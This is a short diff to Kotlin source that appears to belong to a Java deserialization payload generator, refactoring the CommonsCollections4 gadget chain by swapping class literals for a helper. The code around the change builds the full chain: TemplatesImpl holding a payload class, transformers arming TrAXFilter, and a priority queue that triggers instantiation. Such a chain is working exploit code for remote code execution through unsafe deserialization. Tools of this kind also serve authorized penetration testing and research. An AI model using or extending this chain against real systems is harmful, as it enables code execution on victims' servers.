@@ -42,10 +42,10 @@ enum class Chain {
     CommonsCollections4Chain {
         override fun generate(payload: Class<*>): Any {
             val templates = Gadgets.createTemplatesImpl(payload)
-            val constant = ConstantTransformer<Any, Any>(String::class.java)
+            val constant = ConstantTransformer<Any, Any>(clazz<String>())
 
             // mock method name until armed
-            var paramTypes: Array<Class<*>> = arrayOf(String::class.java)
+            var paramTypes: Array<Class<*>> = arrayOf(clazz<String>())
             var args: Array<Any> = arrayOf("foo")
             val instantiate = InstantiateTransformer<Any>(paramTypes, args)
 
@@ -59,8 +59,8 @@ enum class Chain {
             queue.add(1)
             queue.add(1)
 
-            constant.setFieldValue("iConstant", TrAXFilter::class.java)
-            paramTypes[0] = Templates::class.java
+            constant.setFieldValue("iConstant", clazz<TrAXFilter>())
+            paramTypes[0] = clazz<Templates>()
             args[0] = templates
             return queue
         }
